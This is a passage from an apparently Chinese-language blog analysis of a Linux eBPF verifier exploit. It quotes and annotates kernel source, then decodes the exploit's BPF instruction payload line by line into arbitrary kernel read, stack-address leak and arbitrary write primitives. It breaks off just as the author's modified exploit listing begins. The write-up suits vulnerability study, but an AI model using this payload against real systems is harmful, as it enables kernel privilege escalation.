class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">replace_map_fd_with_map_ptr</span><span class="params">(struct verifier_env *env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span> =</span> env-&gt;prog-&gt;insnsi;</span><br><span class="line">    <span class="keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn_cnt; i++, insn++) &#123;  <span class="comment">// 大循环，遍历我们的想要加载的每一条指令</span></span><br><span class="line">        <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_LDX &amp;&amp;</span><br><span class="line">            (BPF_MODE(insn-&gt;code) != BPF_MEM || insn-&gt;imm != <span class="number">0</span>)) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;BPF_LDX uses reserved fields\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_STX &amp;&amp;</span><br><span class="line">            ((BPF_MODE(insn-&gt;code) != BPF_MEM &amp;&amp;</span><br><span class="line">              BPF_MODE(insn-&gt;code) != BPF_XADD) || insn-&gt;imm != <span class="number">0</span>)) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;BPF_STX uses reserved fields\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (insn[<span class="number">0</span>].code == (BPF_LD | BPF_IMM | BPF_DW)) &#123; <span class="comment">// 我们的payload中第五行，code部分为0x18，符合条件，进入此分支</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断payload的第六行是否全空，这里与BPF_LD_IMM64这个指令的结构有关，后面会讲到</span></span><br><span class="line">            <span class="keyword">if</span> (i == insn_cnt - <span class="number">1</span> || insn[<span class="number">1</span>].code != <span class="number">0</span> ||</span><br><span class="line">                insn[<span class="number">1</span>].dst_reg != <span class="number">0</span> || insn[<span class="number">1</span>].src_reg != <span class="number">0</span> ||</span><br><span class="line">                insn[<span class="number">1</span>].off != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;invalid bpf_ld_imm64 insn\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;src_reg == <span class="number">0</span>)</span><br><span class="line">                <span class="comment">/* valid generic load 64-bit imm */</span></span><br><span class="line">                <span class="keyword">goto</span> next_insn;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;src_reg != BPF_PSEUDO_MAP_FD) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;unrecognized bpf_ld_imm64 insn\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 从给出的fd得到指针</span></span><br><span class="line">            f = fdget(insn-&gt;imm);</span><br><span class="line">            <span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line">            <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>)) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;fd %d is not pointing to valid bpf_map\n&quot;</span>,</span><br><span class="line">                    insn-&gt;imm);</span><br><span class="line">                fdput(f);</span><br><span class="line">                <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 保存指针，可以看到，其把指针的值分为了两部分，低32位保存在了exp第五行的IMM区域(最后4个字节)，高32位则保存在了exp第六行的IMM区域</span></span><br><span class="line">            <span class="comment">/* store map pointer inside BPF_LD_IMM64 instruction */</span></span><br><span class="line">            insn[<span class="number">0</span>].imm = (u32) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">map</span>;</span><br><span class="line">            insn[<span class="number">1</span>].imm = ((u64) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">map</span>) &gt;&gt; <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check whether we recorded this map already */</span></span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; env-&gt;used_map_cnt; j++)</span><br><span class="line">                <span class="keyword">if</span> (env-&gt;used_maps[j] == <span class="built_in">map</span>) &#123;</span><br><span class="line">                    fdput(f);</span><br><span class="line">                    <span class="keyword">goto</span> next_insn;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (env-&gt;used_map_cnt &gt;= MAX_USED_MAPS) &#123;</span><br><span class="line">                fdput(f);</span><br><span class="line">                <span class="keyword">return</span> -E2BIG;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* remember this map */</span></span><br><span class="line">            env-&gt;used_maps[env-&gt;used_map_cnt++] = <span class="built_in">map</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* hold the map. If the program is rejected by verifier,</span></span><br><span class="line"><span class="comment">             * the map will be released by release_maps() or it</span></span><br><span class="line"><span class="comment">             * will be used by the valid program until it&#x27;s unloaded</span></span><br><span class="line"><span class="comment">             * and all maps are released in free_bpf_prog_info()</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            bpf_map_inc(<span class="built_in">map</span>, <span class="literal">false</span>);</span><br><span class="line">            fdput(f);</span><br><span class="line">next_insn:</span><br><span class="line">            insn++;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now all pseudo BPF_LD_IMM64 instructions load valid</span></span><br><span class="line"><span class="comment">     * &#x27;struct bpf_map *&#x27; into a register instead of user map_fd.</span></span><br><span class="line"><span class="comment">     * These pointers will be used later by verifier to validate map access.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以从上面的源代码以及我的相应注释中看到，此函数检查我们的指令中是否存在<code>BPF_LD_IMM64</code>指令，如果存在的话，将指令中的立即数所表示的fd转化为指针，保存指针值在我们的exp的第五行以及第六行的IMM区域</p><p>我们第五行的立即数IMM为<code>0x3</code>，我上面有说过，我们一开始申请的map的fd就是3，所以这里就相当于我们将我们之前申请的map与我们的指令进行了绑定</p><p>在注释中我提到为何第六行必须为空，实际上有两个原因，首先是<code>BPF_LD_IMM64</code>指令的格式就是这么要求的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM)                    \</span></span><br><span class="line">    BPF_LD_IMM64_RAW(DST, <span class="number">0</span>, IMM)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)                \</span></span><br><span class="line">    ((struct bpf_insn) &#123;                    \</span><br><span class="line">        .code  = BPF_LD | BPF_DW | BPF_IMM,        \</span><br><span class="line">        .dst_reg = DST,                    \</span><br><span class="line">        .src_reg = SRC,                    \</span><br><span class="line">        .off   = <span class="number">0</span>,                    \</span><br><span class="line">        .imm   = (__u32) (IMM) &#125;),            \</span><br><span class="line">    ((struct bpf_insn) &#123;                    \</span><br><span class="line">        .code  = <span class="number">0</span>, <span class="comment">/* zero is reserved opcode */</span>    \</span><br><span class="line">        .dst_reg = <span class="number">0</span>,                    \</span><br><span class="line">        .src_reg = <span class="number">0</span>,                    \</span><br><span class="line">        .off   = <span class="number">0</span>,                    \</span><br><span class="line">        .imm   = ((__u64) (IMM)) &gt;&gt; <span class="number">32</span> &#125;)</span><br></pre></td></tr></table></figure><p>可以看到，实际上调用<code>BPF_LD_IMM64</code>指令就是调用了<code>BPF_LD_IMM64_RAW</code>指令，此指令需要占据普通指令的2倍大小的空间</p><p>另外，由于指针的值需要被分为两部分储存，故而确实需要第六条指令为空来做存储</p><p>好了，我们接着看下面第七条指令之后的指令</p><p>将其解码之后，指令是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 上面两句payload执行完成后会将map的指针赋值给BPF_REG_9寄存器中</span></span><br><span class="line">[<span class="number">6</span>]: ALU64_MOV_X(<span class="number">9</span>,<span class="number">1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">7</span>]: ALU64_MOV_X(<span class="number">10</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">8</span>]: ALU64_ADD_K(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0xfffffffc</span>)</span><br><span class="line">[<span class="number">9</span>]: ST_MEM_W(<span class="number">0</span>,<span class="number">10</span>,<span class="number">0xfffc</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">10</span>]: JMP_CALL(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>)</span><br><span class="line">[<span class="number">11</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x1</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">12</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">13</span>]: LDX_MEM_DW(<span class="number">0</span>,<span class="number">6</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">14</span>]: ALU64_MOV_X(<span class="number">9</span>,<span class="number">1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">15</span>]: ALU64_MOV_X(<span class="number">10</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">16</span>]: ALU64_ADD_K(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0xfffffffc</span>)</span><br><span class="line">[<span class="number">17</span>]: ST_MEM_W(<span class="number">0</span>,<span class="number">10</span>,<span class="number">0xfffc</span>,<span class="number">0x1</span>)</span><br><span class="line">[<span class="number">18</span>]: JMP_CALL(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>)</span><br><span class="line">[<span class="number">19</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x1</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">20</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">21</span>]: LDX_MEM_DW(<span class="number">0</span>,<span class="number">7</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">22</span>]: ALU64_MOV_X(<span class="number">9</span>,<span class="number">1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">23</span>]: ALU64_MOV_X(<span class="number">10</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">24</span>]: ALU64_ADD_K(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0xfffffffc</span>)</span><br><span class="line">[<span class="number">25</span>]: ST_MEM_W(<span class="number">0</span>,<span class="number">10</span>,<span class="number">0xfffc</span>,<span class="number">0x2</span>)</span><br><span class="line">[<span class="number">26</span>]: JMP_CALL(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>)</span><br><span class="line">[<span class="number">27</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x1</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">28</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">29</span>]: LDX_MEM_DW(<span class="number">0</span>,<span class="number">8</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">30</span>]: ALU64_MOV_X(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">31</span>]: ALU64_MOV_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">32</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">6</span>,<span class="number">0x3</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">33</span>]: LDX_MEM_DW(<span class="number">7</span>,<span class="number">3</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">34</span>]: STX_MEM_DW(<span class="number">3</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">35</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">36</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">6</span>,<span class="number">0x2</span>,<span class="number">0x1</span>)</span><br><span class="line">[<span class="number">37</span>]: STX_MEM_DW(<span class="number">10</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">38</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">39</span>]: STX_MEM_DW(<span class="number">8</span>,<span class="number">7</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">40</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure><p>另附上参考表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">R0 – rax</span><br><span class="line">R1 - rdi</span><br><span class="line">R2 - rsi</span><br><span class="line">R3 - rdx</span><br><span class="line">R4 - rcx</span><br><span class="line">R5 - r8</span><br><span class="line">R6 - rbx</span><br><span class="line">R7 - r13</span><br><span class="line">R8 - r14</span><br><span class="line">R9 - r15</span><br><span class="line">R10 – rbp（帧指针，frame pointer）</span><br></pre></td></tr></table></figure><p>先来看看6～13，翻译出来应该是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">6</span>]: r1=r9</span><br><span class="line">[<span class="number">7</span>]: r2=rbp</span><br><span class="line">[<span class="number">8</span>]: r2 = r2<span class="number">-4</span></span><br><span class="line">[<span class="number">9</span>]: [rbp+(<span class="number">-4</span>)] = <span class="number">0</span></span><br><span class="line">[<span class="number">10</span>]: call BPF_FUNC_map_lookup_elem</span><br><span class="line">[<span class="number">11</span>]: <span class="keyword">if</span> r0== <span class="number">0</span>:</span><br><span class="line">[<span class="number">12</span>]: <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line">[<span class="number">13</span>]: r6=[r0]</span><br></pre></td></tr></table></figure><p>其中编号9的语句，为<code>ST_MEM_W</code>类型的指令，表达的意思是<code>*(uint *) (dst_reg + off16) = imm32</code>，那么带入到此语句即向$rbp-4处赋值0，此举是为了准备参数(r2寄存器)，准备调用<code>BPF_FUNC_map_lookup_elem</code></p><p>编号为11的语句，<code>BPF_FUNC_map_lookup_elem</code>返回的是指针，所以r0中存放的是&amp;map[0]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u64 <span class="title">bpf_map_lookup_elem</span><span class="params">(u64 r1, u64 r2, u64 r3, u64 r4, u64 r5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* verifier checked that R1 contains a valid pointer to bpf_map</span></span><br><span class="line"><span class="comment">     * and R2 points to a program stack and map-&gt;key_size bytes were</span></span><br><span class="line"><span class="comment">     * initialized</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span> =</span> (struct bpf_map *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) r1;</span><br><span class="line">    <span class="keyword">void</span> *key = (<span class="keyword">void</span> *) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) r2;</span><br><span class="line">    <span class="keyword">void</span> *value;</span><br><span class="line"></span><br><span class="line">    WARN_ON_ONCE(!rcu_read_lock_held());</span><br><span class="line"></span><br><span class="line">    value = <span class="built_in">map</span>-&gt;ops-&gt;map_lookup_elem(<span class="built_in">map</span>, key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* lookup() returns either pointer to element value or NULL</span></span><br><span class="line"><span class="comment">     * which is the meaning of PTR_TO_MAP_VALUE_OR_NULL type</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>) value;  <span class="comment">// 返回指针c</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在6～13语句执行完成后就相当于将r6赋值为map中第一个元素的值</p><p>之后的14-21，22-29都是一样的，分别表示的意思是<code>r7 = map[1]</code>,<code>r8 = map[2]</code></p><p>从30行开始，翻译如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">30</span>]: ALU64_MOV_X(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>) r2=r0 <span class="comment">// 此时r0为map[2]的地址</span></span><br><span class="line">[<span class="number">31</span>]: ALU64_MOV_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>) r0=<span class="number">0</span>  <span class="comment">// r0置0</span></span><br><span class="line">[<span class="number">32</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">6</span>,<span class="number">0x3</span>,<span class="number">0x0</span>)   <span class="keyword">if</span> r6!=<span class="number">0</span> jmpto <span class="number">36</span> </span><br><span class="line">[<span class="number">33</span>]: LDX_MEM_DW(<span class="number">7</span>,<span class="number">3</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)  r3 = [r7]</span><br><span class="line">[<span class="number">34</span>]: STX_MEM_DW(<span class="number">3</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)  [r2]=r3</span><br><span class="line">[<span class="number">35</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)    <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line">[<span class="number">36</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">6</span>,<span class="number">0x2</span>,<span class="number">0x1</span>)   <span class="keyword">if</span> r6!=<span class="number">1</span> jmpto <span class="number">39</span></span><br><span class="line">[<span class="number">37</span>]: STX_MEM_DW(<span class="number">10</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>) [r2]=r10</span><br><span class="line">[<span class="number">38</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)    <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line">[<span class="number">39</span>]: STX_MEM_DW(<span class="number">8</span>,<span class="number">7</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)  [r7]=r8</span><br><span class="line">[<span class="number">40</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)    <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，这是最终执行利用的地方</p><p>在经过了6～29语句之后，<code>r6 = map[0]</code>，<code>r7 = map[1]</code>,<code>r8 = map[2]</code></p><p>而且map中的值是由用户定义的，用户可以通过<code>BPF_MAP_UPDATE_ELEM</code>这一bpf的调用type来改变map中每一项的值</p><p>那么根据上面的翻译</p><ol><li>如果用户定义<code>map[0] = 0</code>,那么此时将会执行33-35语句，也就是尝试读<code>map[1]</code>中所保存的值所指向的地址中的值，并把读出的值赋值给<code>map[2]</code></li><li>如果用户定义<code>map[0] = 1</code>,那么此时将会执行37-38语句，也就是尝试将r10寄存器的值赋值给<code>map[2]</code>，而r10在这里代表的是rbp</li><li>如果用户定义<code>map[0] = 2</code>,那么此时将会执行39-40语句，也就是尝试将<code>map[2]</code>中的值赋值给<code>map[1]</code>中所保存的值所指向的地址</li></ol><p>简而言之，当<code>map[0]</code>为1、2、3时，分别代表了任意地址读，泄露内核栈地址、任意地址写这三个功能</p><p>知道了这些后，exp就十分容易明白了</p><p>贴出我修改的exp，在我的机器上运行成功</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span 